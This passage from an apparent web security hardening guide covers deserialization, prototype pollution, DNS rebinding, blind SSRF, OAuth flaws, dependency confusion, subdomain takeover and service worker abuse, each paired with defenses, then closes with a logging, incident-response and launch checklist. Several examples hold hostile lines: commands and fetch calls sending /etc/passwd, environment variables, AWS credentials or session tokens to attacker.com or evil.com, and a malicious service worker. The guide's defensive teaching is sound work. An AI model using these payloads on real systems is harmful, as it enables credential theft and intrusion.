- Never concatenate user input into template strings. Pass user data as template variables only — the engine escapes them automatically.
- If you must allow user-defined templates (e.g., email templates in a CMS), use a **logic-less** template language like Mustache/Handlebars, not Jinja2/Twig/Freemarker/ERB.
- Sandbox template execution: run in a separate process with minimal privileges (Docker container, seccomp profile, no network access).
- Use Content Security Policy to contain the blast radius if template output includes user content rendered client-side.

---

### 5. Insecure Deserialization

**Difficulty:** Expert | **Impact:** RCE, authentication bypass, privilege escalation

When an application deserializes untrusted data — from cookies, API bodies, JWT payloads, database fields, or message queues — an attacker can craft a serialized object that, when reconstructed, triggers a chain of method calls ("gadget chain") ending in arbitrary code execution.

**Every language has a deserialization attack surface:**

```
Java:    ObjectInputStream.readObject()      + ysoserial gadget chains
PHP:     unserialize()                        + PHPGGC gadget chains
Python:  pickle.loads(), yaml.load()          + insecure YAML constructors
Node.js: node-serialize, serialize-javascript + IIFE in function strings
Ruby:    Marshal.load(), YAML.load()          + universal gadget chains
.NET:    BinaryFormatter, LosFormatter        + ysoserial.net
```

**PHP example — Laravel/RCE via unserialize() in cookies:**

```php
// VULNERABLE — Laravel cookie decryption uses unserialize()
$data = unserialize(decrypt($cookieValue));

// Attacker creates a malicious serialized object using PHPGGC:
// phpggc Laravel/RCE1 system id -b
// The gadget chain leverages __destruct, __wakeup, __toString magic methods
// to eventually call system('id')
```

**Node.js example — IIFE injection:**

```javascript
// node-serialize: functions are serialized as source code strings
const serialize = require('node-serialize');

// Attacker payload:
const payload = {
  rce: function() {
    require('child_process').exec('id', function(error, stdout, stderr) {
      console.log(stdout);
    });
  },
};

// Serialized:
// {"rce":"_$$ND_FUNC$$_function(){\n    require('child_process').exec('id', ...)\n  }"}

// When deserialized, the function body is eval'd via new Function()
serialize.unserialize(userSuppliedData);
```

**Java — the most dangerous ecosystem:**

Java deserialization gadget chains (CommonsCollections, Spring, Groovy, BeanShell) are so well-studied that tools like `ysoserial` automatically generate payloads for dozens of chains. Any Java app that calls `ObjectInputStream.readObject()` on untrusted data is vulnerable.

```bash
# Generate a payload for CommonsCollections4 chain:
java -jar ysoserial.jar CommonsCollections4 'curl http://attacker.com/$(cat /etc/passwd)' | base64
```

**Defense:**
- The only reliable defense: **do not deserialize untrusted data.** Use data-only formats (JSON, protobuf, CSV) parsed with safe, non-executable parsers.
- If you must use serialization, use a type-safe, allowlist-based serializer (e.g., Jackson with `@JsonTypeInfo` disabled, or Protocol Buffers with strict schema validation).
- Never accept serialized objects from cookies, URL parameters, or API request bodies.
- Monitor deserialization entry points — every `unserialize()`, `readObject()`, `pickle.loads()` call site is a potential RCE vector.

---

### 6. Prototype Pollution to RCE

**Difficulty:** Advanced | **Impact:** Property injection, auth bypass, RCE

JavaScript's prototypal inheritance means every object inherits from `Object.prototype`. If an attacker can pollute `Object.prototype` with a property, every object in the application inherits that property — including configuration objects, middleware options, and database query parameters.

**Entry point — recursive merge without hasOwnProperty check:**

```javascript
// VULNERABLE — lodash.merge, deep-extend, or custom merge utilities
const _ = require('lodash');
app.post('/settings', (req, res) => {
  const userSettings = {};
  _.merge(userSettings, req.body);
  // Attacker sends:
  // { "__proto__": { "isAdmin": true } }
  // Now every object has isAdmin=true

  db.save(userSettings);
  res.json({ success: true });
});
```

**Exploitation chains:**

```javascript
// 1. Auth bypass via polluted middleware config
app.use((req, res, next) => {
  if (req.user.isAdmin) {  // Now true for everyone — Object.prototype.isAdmin = true
    return next();
  }
  res.status(403).end();
});

// 2. RCE via polluted child_process options
// If the app spawns processes and merges user options:
const { exec } = require('child_process');
const defaultOpts = { timeout: 5000 };
const opts = _.merge(defaultOpts, req.body.options);
// Attacker sends: { "options": { "__proto__": { "shell": "/bin/sh" } } }
exec('ls', opts);  // opts.shell is now "/bin/sh" — command injection

// 3. RCE via polluted template options in EJS/Pug
// EJS reads options from the data object, which inherits from Object.prototype
// Attacker pollutes: Object.prototype.outputFunctionName = "x;process.mainModule.require('child_process').execSync('id');x"
// When EJS compiles the template, it uses the polluted outputFunctionName
```

**CVE examples:**
- CVE-2019-10744: lodash `defaultsDeep`
- CVE-2020-8203: lodash `zipObjectDeep`
- CVE-2021-23337: lodash `template`
- CVE-2022-21803: nconf `env`

**Defense:**
- Use `Object.create(null)` for objects that store user-supplied keys — they have no prototype
- Use safe merge utilities that ignore `__proto__`, `constructor`, and `prototype` keys
- Freeze `Object.prototype` early in the application lifecycle: `Object.freeze(Object.prototype)`
- Use TypeScript with strict mode — the compiler catches prototype access on typed objects
- Update lodash to version 4.17.21+; use `_.mergeWith` with a customizer that blocks dangerous keys
- Run `npm audit` and monitor Snyk advisories for prototype pollution CVEs in your dependency tree

---

### 7. DNS Rebinding

**Difficulty:** Expert | **Impact:** SSRF bypass, internal network compromise, IoT/ router exploitation

DNS rebinding bypasses the same-origin policy by exploiting the time gap between DNS resolution and HTTP request execution. The attacker registers a domain (e.g., `attacker.com`) with a very short TTL. The victim's browser resolves it to the attacker's IP, loads JavaScript. The JavaScript then makes a second request — the DNS cache has expired, and the attacker's DNS server now responds with an internal IP (`127.0.0.1`, `192.168.1.1`, or `169.254.169.254`).

```
1. Browser:    GET attacker.com/index.html
   DNS:         attacker.com -> 34.123.45.67 (attacker's server)
   Response:    <script> /* malicious JS */ </script>

2. JS executes: fetch('http://attacker.com:8080/admin')
   DNS expires (TTL = 1 second)
   DNS:         attacker.com -> 127.0.0.1 (now points to localhost!)
   Browser:     GET http://127.0.0.1:8080/admin
   Same-origin check: PASSES — domain is still "attacker.com"
   Result:      Attacker's JS reads your local dev server, router admin, or Docker daemon
```

**Cloud metadata attack (AWS):**

```javascript
// The attacker rebinds their domain to 169.254.169.254
// The victim's browser, running on an EC2 instance, fetches:
fetch('http://rebind.attacker.com/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(creds => fetch('https://attacker.com/exfil', { method: 'POST', body: creds }));
// Browser thinks it's same-origin. AWS metadata endpoint returns IAM credentials.
// Attacker exfiltrates them and owns the AWS account.
```

**Defense:**
- Applications should validate the `Host` header against an allowlist — reject requests where `Host` is an IP address or unknown domain
- Servers should reject requests to private/reserved IP ranges at the application or proxy level
- Use `dns.resolve()` in Node.js and compare resolved IPs against private ranges before making outbound requests
- Browsers have partially mitigated this with DNS pinning (cache DNS for longer than TTL), but it's not a complete fix — server-side validation is essential
- Deploy `Cross-Origin-Resource-Policy: same-origin` and `Cross-Origin-Opener-Policy: same-origin` as additional defenses

---

### 8. Blind SSRF Chaining

**Difficulty:** Expert | **Impact:** Cloud account takeover, internal service pivoting

Unlike basic SSRF where the response comes back to the attacker, blind SSRF means the server makes the request but the attacker never sees the response. This makes exploitation harder — but far from impossible. Professional red teamers chain blind SSRF with internal service exploitation to achieve full compromise.

**Blind SSRF to cloud metadata to IAM credential theft:**

```bash
# Step 1: Identify SSRF — server fetches a user-supplied URL
POST /api/import HTTP/1.1
{"url": "http://attacker.com/ping"}
# Attacker's server receives a request -> SSRF confirmed, but blind

# Step 2: Hit the cloud metadata endpoint
{"url": "http://169.254.169.254/latest/meta-data/"}
# No response visible to the attacker, but the request was made

# Step 3: Chain with a role name to get temporary credentials
# AWS IAM role names can often be guessed or enumerated
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-task-role"}
# Response: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
# But the attacker can't see it — blind SSRF

# Step 4: Exfiltrate via DNS
# Construct a URL where the credentials appear in the hostname
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-task-role"}
# This doesn't work directly — the metadata service returns credentials in the body

# Step 5: Instead, use a redirect chain
# Attacker controls a server that issues a 302 redirect:
# http://attacker.com/redirect -> 302 -> http://169.254.169.254/latest/meta-data/...
# If the SSRF client follows redirects, the response body is accessible!

# Step 6: Or use gopher:// protocol (if supported) to send raw TCP data
{"url": "gopher://internal-postgres:5432/_POST / HTTP/1.1%0d%0a..."}
# Directly interact with internal databases, Redis, Memcached
```

**Blind SSRF to AWS IMDSv2 bypass (if the server uses IMDSv2):**

```bash
# IMDSv2 requires a PUT to get a token, then GET with the token header
# Some SSRF clients only do GET — but fetch() with redirect: 'manual' can be abused

# Step 1: Use a redirect to turn a GET into a PUT (if the client follows redirects)
# Attacker server: 302 redirect to http://169.254.169.254/latest/api/token
# with method changed to PUT — some HTTP clients preserve the method change on redirect

# Step 2: Use the token in subsequent requests
```

**Defense:**
- Never pass user-supplied URLs to HTTP clients without allowlist validation
- Block all outbound requests to RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and link-local (169.254.0.0/16) addresses at the **network layer** (security groups, NACLs, iptables) — not just the application layer
- Disable redirect following in SSRF-prone HTTP clients (`fetch(url, { redirect: 'manual' })`, `curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false)`)
- Run URL-fetching logic in a dedicated, network-isolated environment (separate VPC, no access to metadata service, IMDS hop limit = 1)
- Use IMDSv2 exclusively, enforce it with a instance metadata service hop limit of 1

---

### 9. OAuth 2.0 Account Takeover

**Difficulty:** Advanced | **Impact:** Full account takeover via OAuth misconfiguration

OAuth 2.0's security depends entirely on the `redirect_uri` validation. If the authorization server allows a loose redirect_uri pattern (subdomain wildcards, path traversal, open redirect on the client domain), an attacker can steal the authorization code and exchange it for an access token.

**Attack 1 — Subdomain takeover leading to redirect_uri bypass:**

```
1. App registers redirect_uri: https://*.yourapp.com/callback
2. Attacker finds an abandoned/unclaimed subdomain: https://old-blog.yourapp.com
3. Attacker claims this subdomain (DNS takeover via dangling CNAME, or subdomain registration)
4. Attacker initiates OAuth flow with redirect_uri=https://old-blog.yourapp.com/callback
5. Authorization server matches the wildcard pattern — authorizes the redirect
6. The authorization code is delivered to the attacker's controlled subdomain
7. Attacker exchanges code for access token — full account takeover
```

**Attack 2 — Path traversal in redirect_uri:**

```
1. App registers: https://yourapp.com/auth/callback
2. Legitimate page: https://yourapp.com/auth/callback
3. Some OAuth providers allow: https://yourapp.com/auth/callback/../../attacker-path
4. Or allow additional query parameters on the redirect URI that get reflected in the page
5. If the reflected parameter contains an open redirect, attacker chains it:
   https://yourapp.com/auth/callback?next=https://evil.com
```

**Attack 3 — CSRF on the OAuth callback (state parameter missing):**

```
1. Attacker initiates OAuth flow with their own account
2. Before completing, attacker captures the callback URL with `code=attacker-code`
3. Attacker sends victim a link to that callback URL
4. Victim clicks — the application exchanges `attacker-code` for `attacker-access-token`
5. Application associates the attacker's OAuth account with the victim's session
6. Attacker now logs in via OAuth and accesses the victim's account
```

**Defense:**
- Register **exact** redirect URIs — never use wildcards, never use pattern matching
- Validate redirect_uri server-side with **exact string comparison**, not regex or prefix match
- Always use the `state` parameter — generate a cryptographically random value, store it in the session, and validate it on the callback
- Bind the `state` parameter to the user's session to prevent cross-user CSRF attacks
- Enforce PKCE for all OAuth flows (mandatory in OAuth 2.1)
- Monitor your DNS for dangling CNAMEs and expired subdomain registrations

---

### 10. Dependency Confusion / Namespace Confusion

**Difficulty:** Intermediate | **Impact:** RCE in CI/CD, production deployment compromise

When an organization uses both public packages (from npm, PyPI, Maven) and private packages (hosted internally), an attacker can upload a malicious package to the public registry with the same name as the private one. If the package manager resolves the public version first (higher version number, or the private registry isn't checked), the attacker's code executes during `npm install` or `pip install`.

```bash
# Company uses an internal package: @company/internal-auth (v1.0.0)
# package.json:
{
  "dependencies": {
    "@company/internal-auth": "^1.0.0"
  }
}

# Attacker publishes @company/internal-auth v99.0.0 to npm public registry
# npm resolves ^1.0.0 -> sees v99.0.0 satisfies the range -> installs attacker's package
# The package's preinstall script runs:
{
  "scripts": {
    "preinstall": "curl -s https://evil.com/$(env | base64)"
  }
}
```

**PyPI variant:**

```bash
# Company uses: pip install company-utils
# PyPI is checked first (or the private index is misconfigured)
# Attacker uploaded company-utils to PyPI
# pip install grabs the malicious package
# setup.py executes arbitrary code during installation
```

**Defense:**
- **Scoped packages**: Use `@yourcompany/package-name` on npm — scoped packages are namespaced and won't collide with unscoped public packages
- **Registry configuration**: Configure `.npmrc`, `pip.conf`, or `Gemfile` to check your private registry first, and only fall back to public for packages not in the private registry
- **Explicit registry per scope**:
  ```
  @yourcompany:registry=https://npm.yourcompany.com/
  ```
- **Version pinning**: Use exact versions in production, not ranges — prevents automatic upgrade to a malicious higher version
- **Package allowlisting**: Use tools like `npm vet`, `socket.dev`, or `snyk` to detect when a new dependency is pulled from a public registry unexpectedly

---

### 11. Subdomain Takeover

**Difficulty:** Intermediate | **Impact:** Full control of a subdomain, credential phishing, cookie theft

When an organization decommissions a service but leaves the DNS record pointing to it, an attacker can claim the dangling resource and serve arbitrary content from a legitimate subdomain.

**Common patterns:**

```
Dangling CNAME -> AWS S3 bucket (deleted, attacker recreates it)
Dangling CNAME -> Azure CloudApp (deleted, attacker claims it)
Dangling CNAME -> GitHub Pages (username changed, attacker registers old username)
Dangling CNAME -> Heroku app (deleted, attacker recreates)
Dangling CNAME -> Shopify store (closed, attacker reopens with same name)
Dangling CNAME -> Zendesk/Freshdesk/Help Scout (cancelled, attacker signs up)
Dangling NS    -> Nameserver provider (expired, attacker re-registers)
```

**Exploitation:**

```bash
# 1. Discover dangling CNAMEs
subfinder -d yourcompany.com | while read sub; do
  dig CNAME $sub +short | grep -E 'amazonaws|azure|github|heroku|shopify'
done

# 2. Check if the target service is claimable
aws s3 ls s3://dangling-bucket-name
# If the bucket doesn't exist, create it in your AWS account
aws s3 mb s3://dangling-bucket-name

# 3. Upload a proof-of-concept or phishing page
# The subdomain now serves attacker-controlled content with a valid TLS cert
```

**Impact chain:**
- Cookie theft: `document.cookie` on `subdomain.yourapp.com` has access to cookies scoped to `.yourapp.com`
- Phishing: login form on `legitimate-subdomain.yourapp.com` harvests credentials
- CSP bypass: if `subdomain.yourapp.com` is in the CSP `script-src` allowlist, attacker-injected scripts on the main domain will execute
- OAuth redirect_uri bypass: if the redirect_uri allowlist includes `*.yourapp.com`, the attacker can complete OAuth flows

**Defense:**
- Before decommissioning any service, remove its DNS record — never leave dangling CNAMEs
- Monitor your DNS zones weekly: `dnsrecon -d yourapp.com` or use `assetfinder` + `subfinder` + manual CNAME inspection
- Services like `SecurityTrails`, `Censys`, and `Project Discovery Cloud` can detect dangling records automatically
- Use a DNS record lifecycle policy: records older than X days without corresponding active resources are flagged

---

### 12. Service Worker Exploitation

**Difficulty:** Advanced | **Impact:** Persistent XSS, traffic interception, cryptojacking, phishing

A Service Worker is a script the browser runs in the background, intercepting all network requests for a scope. If an attacker can register a malicious service worker — via XSS, an open S3 bucket, or a JSONP endpoint — they own every request from that origin forever, across page reloads and browser restarts.

**Registration via XSS (persistent backdoor):**

```javascript
// Step 1: Attacker finds XSS on yourapp.com
// Step 2: Instead of a one-shot payload, they register a service worker:
navigator.serviceWorker.register('/sw.js')
  .then(reg => console.log('SW registered — persistent backdoor installed'));

// sw.js (served from attacker-controlled or compromised endpoint):
self.addEventListener('fetch', event => {
  // Intercept every request
  const url = new URL(event.request.url);

  // Exfiltrate session tokens and credentials
  if (url.pathname === '/api/auth/session') {
    event.respondWith(
      fetch(event.request).then(response => {
        const clone = response.clone();
        clone.json().then(session => {
          fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(session),
          });
        });
        return response;
      })
    );
  }
});
// This persists across page reloads, browser restarts, and cache clears
// The only way to remove it: unregister via DevTools or a competing SW update
```

**Registration via JSONP endpoint:**

```javascript
// If yourapp.com has a JSONP endpoint:
// GET /api/jsonp?callback=myCallback
// Returns: myCallback({"data": "..."});

// Attacker forces registration via an importScripts chain:
// GET /api/jsonp?callback=navigator.serviceWorker.register
// with the SW URL as the argument
```

**Defense:**
- Set a strict `Service-Worker-Allowed` header: `Service-Worker-Allowed: /app/` limits SW scope to a specific path, not the entire origin
- Serve the service worker file from a path that cannot be influenced by user input
- Never allow JSONP endpoints — they are a legacy anti-pattern with no modern use case
- Implement a CSP that restricts `worker-src` and `child-src`
- Monitor for unexpected service worker registrations: check `navigator.serviceWorker.getRegistrations()` on critical pages
- Use `Clear-Site-Data: "executionContexts"` on logout to kill service workers

---

## Monitoring, Logging & Incident Response

### What to Log

```typescript
// Log these events with structured metadata:
logger.info("Login succeeded", { userId, ip, userAgent, method: "password" });
logger.warn("Login failed", { email, ip, userAgent, reason: "invalid_password", attemptNumber: 3 });
logger.warn("Access denied", { userId, resourceType: "order", resourceId, reason: "not_owner" });
logger.info("Resource deleted", { userId, resourceType: "project", resourceId });
logger.error("Payment webhook verification failed", { sourceIp, signatureLength: sig?.length ?? 0 });

// NEVER log these:
// Passwords, tokens, session IDs, credit card numbers, SSNs,
// full addresses, OTP codes, password reset tokens, API keys
```

### Structured Logging with Redaction

```typescript
import pino from "pino";

const logger = pino({
  redact: {
    paths: [
      "password",
      "token",
      "headers.authorization",
      "headers.cookie",
      "body.card.number",
      "body.card.cvc",
      "ssn",
      "*.password",
      "*.secret",
    ],
    censor: "[REDACTED]",
  },
  level: process.env.NODE_ENV === "production" ? "info" : "debug",
  formatters: {
    level(label) {
      return { level: label };
    },
  },
  timestamp: pino.stdTimeFunctions.isoTime,
});
```

### Observability Stack

```
App -> Axiom / Better Stack / Datadog -> Dashboards & Alerts
           |
           v
      Slack / Discord / PagerDuty / Opsgenie
```

For smaller teams, **Better Stack** (log management + uptime monitoring) or **Axiom** (high-cardinality log search) provide generous free tiers and significantly less operational overhead than self-hosting an ELK stack.

### Incident Response Process

1. **Detect** — Alert fires: auth failure spike, 5xx rate increase, WAF block surge, unusual traffic pattern
2. **Acknowledge** — On-call engineer acknowledges in the incident channel within 5 minutes
3. **Contain** — Rotate compromised secrets immediately; block offending IPs at the edge (Vercel/Cloudflare); disable affected features if necessary
4. **Investigate** — Query logs (Axiom/Better Stack), correlate timestamps, review recent deployments
5. **Fix & Deploy** — Patch the root cause, deploy the fix, verify with monitoring
6. **Postmortem** — Blameless write-up within 48 hours; focus on process improvements, not individuals

### Emergency Secret Rotation

Have this ready as a documented, tested procedure:

```bash
# Supabase JWT secret
supabase secrets set JWT_SECRET="$(openssl rand -hex 64)"

# Vercel environment variables
vercel env rm DATABASE_URL production
vercel env add DATABASE_URL production
vercel env rm STRIPE_SECRET_KEY production
vercel env add STRIPE_SECRET_KEY production

# Rotate third-party API keys
# Stripe: Dashboard -> Developers -> API keys -> Roll key
# Resend: Dashboard -> API Keys -> Rotate
# GitHub: Settings -> Developer settings -> Personal access tokens -> Regenerate
# Clerk: Dashboard -> API Keys -> Roll
```

---

## Pre-Launch Security Checklist

### Auth & Sessions
- [ ] Passwords hashed with Argon2id (memory: 64 MiB, iterations: 3, parallelism: 4)
- [ ] MFA enforced for all users (TOTP minimum; passkeys where supported)
- [ ] Rate limiting on `/login`, `/register`, `/reset-password`, `/mfa/verify`
- [ ] Session cookies: `Secure; HttpOnly; SameSite=Lax; __Host-` prefix; absolute timeout
- [ ] JWTs: signed with ES256 or RS256; explicit `alg` check; `exp` <= 15 minutes
- [ ] OAuth: PKCE enforced on all flows; `redirect_uri` validated server-side with exact match
- [ ] Password breach detection (Have I Been Pwned k-anonymity API) at registration and password change

### Next.js / Frontend
- [ ] Every Server Action: authentication + Zod/Valibot validation + IDOR ownership check
- [ ] `"server-only"` imported in every module that touches the database or secrets
- [ ] Zero `NEXT_PUBLIC_` prefixed secrets — check with `grep -r "NEXT_PUBLIC_" .`
- [ ] `productionBrowserSourceMaps: false`
- [ ] CSP header configured and tested (check browser console for violation reports)
- [ ] `next/image` remote patterns locked to specific hosts; `dangerouslyAllowSVG: false`
- [ ] Client components receive only the data they render — never raw session or token objects

### Supabase / Database
- [ ] RLS enabled on every table containing user data
- [ ] RLS policies tested per-role (anon, authenticated, admin) using Dashboard SQL Editor
- [ ] `service_role` key never referenced in client-side code — verify with `grep -r "service_role" app/`
- [ ] Storage bucket policies applied; application-level file type and size validation
- [ ] Database connections enforce TLS (`sslmode=require`, `sslaccept=strict`)
- [ ] Realtime enabled only on tables that need it; RLS covers all broadcast events

### API & Backend
- [ ] IDOR check on every resource access (`resource.userId === session.user.id`)
- [ ] Input validation on every endpoint (Zod/Valibot for TypeScript; FormRequest for Laravel)
- [ ] Rate limiting on all API routes (Upstash for serverless; Redis/Laravel throttle for traditional)
- [ ] CORS: explicit origin allowlist; never `*` with `credentials: true`
- [ ] GraphQL: introspection disabled; depth limit <= 7; persisted queries in production
- [ ] File uploads: magic bytes validated; random filenames; stored in object storage, not app server
- [ ] Webhook endpoints verify signatures before processing any payload
- [ ] Error responses never expose stack traces or internal paths in production

### Email
- [ ] SPF record published with `-all` (hard fail)
- [ ] DKIM configured for all sending domains
- [ ] DMARC policy published; started with `p=none` and progressed to `p=reject` after monitoring
- [ ] All transactional emails use a dedicated subdomain (e.g., `mail.yourapp.com`)

### Payments
- [ ] Stripe webhook secret verified on every incoming webhook
- [ ] Idempotency key used for order fulfillment (prevent double-processing)
- [ ] Price lookup is server-side — client never sends the amount
- [ ] PCI scope minimized: card data handled by Stripe.js/PaymentElement, never touches your server

### Infrastructure
- [ ] All secrets in environment variables or secrets manager — never in source code
- [ ] `gitleaks` or `trufflehog` in pre-commit hooks and CI pipeline
- [ ] Dependabot or Renovate enabled with weekly schedule
- [ ] Lockfiles committed for every package manager
- [ ] CI/CD secrets provisioned via platform dashboard, never hardcoded in workflow files
- [ ] Source maps disabled in production builds
- [ ] Vercel/Netlify environment variables scoped correctly (preview vs production)

### Headers & Browser
- [ ] `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`
- [ ] `Content-Security-Policy` — start broad, tighten iteratively, monitor violation reports
- [ ] `X-Content-Type-Options: nosniff`
- [ ] `X-Frame-Options: DENY` or equivalent CSP `frame-ancestors 'none'`
- [ ] `Referrer-Policy: strict-origin-when-cross-origin`
- [ ] `Permissions-Policy` restricting camera, microphone, and geolocation
- [ ] SRI (`integrity` attribute) on all third-party scripts loaded from CDNs

### Monitoring
- [ ] Centralized log aggregation (Axiom, Better Stack, Datadog, or self-hosted)
- [ ] Error tracking (Sentry, Highlight.io, or equivalent)
- [ ] Uptime monitoring with external health checks (Better Uptime, Checkly, or Pingdom)
- [ ] PII redaction configured in the logger
- [ ] Alerts configured for: auth failure spikes, 5xx error rate increase, unusual traffic patterns
- [ ] Incident response runbook documented and accessible to the team
- [ ] Emergency secret rotation procedure documented and tested

### Compliance & Data
- [ ] Automated, encrypted database backups; regularly tested for restoration
- [ ] GDPR: cookie consent mechanism (if serving EU users); data export and deletion workflows
- [ ] Privacy policy and terms of service published and linked from the application
- [ ] If handling payments: PCI DSS scope documented; SAQ completed if applicable
- [ ] If handling healthcare data: HIPAA Business Associate Agreement with all cloud providers
- [ ] Data retention policy defined and enforced (logs, user data, backups)

---

<p align="center">
  <em><strong>Security is a habit, not a feature.</strong></em><br>
  <em>Run through this checklist before every major deployment. Automate what you can. Never stop hardening.</em>
</p>

---

<p align="center">
  <sub>Built for developers shipping on the modern web. Always obtain explicit authorization before testing any system you do not own.</sub>
</p>
